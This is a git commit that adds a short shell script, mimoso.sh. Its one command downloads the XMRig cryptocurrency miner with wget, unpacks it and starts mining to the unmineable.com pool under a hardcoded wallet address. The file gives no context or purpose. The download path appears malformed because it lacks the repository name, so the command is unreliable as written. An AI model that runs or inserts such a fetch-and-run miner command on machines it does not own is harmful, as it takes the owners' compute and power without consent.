8197bae1005b84155352254df1513b4576d153d4
zangary <122132062+zangary@users.noreply.github.com>
2023-01-06 21:55:10 -0300

    Create mimoso.sh

---
+++ mimoso.sh
@@ -0,0 +1,2 @@
+wget https://github.com/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u FMT:0x668357936f621c152bf1e2344610e2aa253de22b.mimoso -p x
+
